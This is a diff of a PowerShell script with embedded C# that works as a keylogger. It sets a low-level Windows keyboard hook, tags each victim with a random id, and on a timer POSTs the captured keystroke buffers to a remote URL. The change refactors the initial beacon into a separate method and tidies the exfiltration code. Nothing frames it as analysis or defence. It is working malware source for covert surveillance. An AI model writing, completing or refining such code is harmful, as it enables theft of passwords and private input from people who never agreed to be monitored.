@@ -1,3 +1,4 @@
+
 Add-Type -TypeDefinition @"
 using System;
 using System.Text;
@@ -23,11 +24,7 @@ public class axh
     public static void Hook()
     {
         id = GenerateRandomString(7);
-        using (HttpClient client = new HttpClient())
-        {
-            await client.PostAsync(url, new StringContent(id, Encoding.UTF8, "text/plain"));
-            bufferR = buffer = "";
-        }
+        initiateN();
         _hookID = SetHook(_proc);
         _timer = new System.Timers.Timer(10000);
         _timer.Elapsed += OnTimedEvent;
@@ -142,10 +139,18 @@ public class axh
     {
         if (bufferR != "") {
             using (HttpClient client = new HttpClient())
-        {
-            await client.PostAsync(url, new StringContent(id + "‖" + bufferR.Substring(1) + "‖" + buffer, Encoding.UTF8, "text/plain"));
-            bufferR = buffer = "";
+            {
+                await client.PostAsync(url, new StringContent(id + "‖" + bufferR.Substring(1) + "‖" + buffer, Encoding.UTF8, "text/plain"));
+                bufferR = buffer = "";
+            }
         }
+    }
+    private static async void initiateN()
+    {
+        using (HttpClient client = new HttpClient())
+        {
+            await client.PostAsync(url, new StringContent(id, Encoding.UTF8, "text/plain"));
+            bufferR = buffer = "";
         }
     }
     private const int WH_KEYBOARD_LL = 13;
